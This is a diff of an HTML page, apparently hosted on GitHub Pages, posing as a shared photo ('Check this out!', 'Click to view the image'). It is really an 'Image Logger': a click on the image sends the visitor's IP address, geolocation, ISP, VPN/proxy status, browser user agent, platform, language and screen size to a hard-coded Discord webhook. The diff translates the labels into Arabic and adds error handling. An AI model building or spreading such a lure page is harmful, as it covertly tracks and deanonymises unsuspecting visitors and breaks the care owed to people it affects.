@@ -3,11 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Maroc Photo</title>
+  <title>Image Maroc</title>
   <meta property="og:title" content="Check this out!">
   <meta property="og:description" content="Click to view the image.">
-  <meta property="og:image" content="https://anas-com.github.io/image-maroc//photo.jpg"> <!-- Replace with your GitHub Pages link -->
-  <meta property="og:url" content="https://your-github-pages-link"> <!-- Replace with your GitHub Pages link -->
+  <meta property="og:image" content="https://your-github-username.github.io/image-maroc/photo.jpg"> <!-- استبدل برابط GitHub Pages الخاص بك -->
+  <meta property="og:url" content="https://your-github-username.github.io/image-maroc"> <!-- استبدل برابط GitHub Pages الخاص بك -->
   <style>
     body {
       margin: 0;
@@ -40,66 +40,74 @@
 <body>
   <img src="photo.jpg" alt="Image" onclick="logInfo()">
   <div class="message" id="message">
-    Clicking
+    Click Photo
   </div>
 
   <script>
     async function logInfo() {
       try {
-        // Fetch the user's IP address
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const ip = ipData.ip;
+        console.log("جاري جلب عنوان IP...");
+        let ip = 'غير معروف';
+        try {
+          const ipResponse = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipResponse.json();
+          ip = ipData.ip;
+        } catch (ipError) {
+          console.error("فشل في جلب عنوان IP:", ipError);
+        }
 
-        // Get additional information using IP-API
-        const infoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
-        const infoData = await infoResponse.json();
+        console.log("جاري جلب معلومات إضافية...");
+        let infoData = {};
+        try {
+          const infoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
+          infoData = await infoResponse.json();
+        } catch (infoError) {
+          console.error("فشل في جلب المعلومات الإضافية:", infoError);
+        }
 
-        // Extract relevant information
-        const country = infoData.country || 'Unknown';
-        const region = infoData.regionName || 'Unknown';
-        const city = infoData.city || 'Unknown';
-        const timezone = infoData.timezone || 'Unknown';
-        const isp = infoData.isp || 'Unknown';
-        const as = infoData.as || 'Unknown';
-        const mobile = infoData.mobile ? 'Yes' : 'No';
-        const proxy = infoData.proxy ? 'Yes' : 'No';
+        const country = infoData.country || 'غير معروف';
+        const region = infoData.regionName || 'غير معروف';
+        const city = infoData.city || 'غير معروف';
+        const timezone = infoData.timezone || 'غير معروف';
+        const isp = infoData.isp || 'غير معروف';
+        const as = infoData.as || 'غير معروف';
+        const mobile = infoData.mobile ? 'نعم' : 'لا';
+        const proxy = infoData.proxy ? 'نعم' : 'لا';
 
-        // Get the user agent and other browser information
         const userAgent = navigator.userAgent;
         const platform = navigator.platform;
         const language = navigator.language;
         const screenResolution = `${window.screen.width}x${window.screen.height}`;
 
-        // Prepare the data to send to Discord
-        const webhookURL = 'https://discord.com/api/webhooks/1334926552739086376/JGGI5sZsZqEOplR03c4_odbTkw1hByXykBul_NJ--Qj3OGA1GXO3fSuiZLajZICgHqAx'; // Replace with your Discord webhook URL
+        console.log("جاري إعداد البيانات لإرسالها إلى Discord...");
+        const webhookURL = 'https://discord.com/api/webhooks/1334926552739086376/JGGI5sZsZqEOplR03c4_odbTkw1hByXykBul_NJ--Qj3OGA1GXO3fSuiZLajZICgHqAx'; // استبدل برابط الويبهوك الخاص بك
         const embed = {
           username: 'Image Logger',
           embeds: [
             {
-              title: 'New IP Logged',
+              title: 'تم تسجيل IP جديد',
               color: 0x00ff00,
               fields: [
-                { name: 'IP Address', value: ip },
-                { name: 'Country', value: country },
-                { name: 'Region', value: region },
-                { name: 'City', value: city },
-                { name: 'Timezone', value: timezone },
-                { name: 'ISP', value: isp },
+                { name: 'عنوان IP', value: ip },
+                { name: 'البلد', value: country },
+                { name: 'المنطقة', value: region },
+                { name: 'المدينة', value: city },
+                { name: 'المنطقة الزمنية', value: timezone },
+                { name: 'مزود الخدمة', value: isp },
                 { name: 'AS', value: as },
-                { name: 'Mobile', value: mobile },
-                { name: 'Proxy/VPN', value: proxy },
+                { name: 'هاتف محمول', value: mobile },
+                { name: 'بروكسي/ VPN', value: proxy },
                 { name: 'User Agent', value: userAgent },
-                { name: 'Platform', value: platform },
-                { name: 'Language', value: language },
-                { name: 'Screen Resolution', value: screenResolution },
+                { name: 'النظام', value: platform },
+                { name: 'اللغة', value: language },
+                { name: 'دقة الشاشة', value: screenResolution },
               ],
               timestamp: new Date().toISOString(),
             },
           ],
         };
 
-        // Send the data to Discord
+        console.log("جاري إرسال البيانات إلى Discord...");
         await fetch(webhookURL, {
           method: 'POST',
           headers: {
@@ -108,10 +116,10 @@
           body: JSON.stringify(embed),
         });
 
-        // Show a confirmation message
-        document.getElementById('message').textContent = 'maroc.';
+        console.log("تم إرسال البيانات بنجاح!");
+        document.getElementById('message').textContent = 'Successfully Photo God';
       } catch (error) {
-        console.error('Error logging information:', error);
+        console.error('حدث خطأ أثناء تسجيل المعلومات:', error);
         document.getElementById('message').textContent = 'Failed to show Photo.';
       }
     }
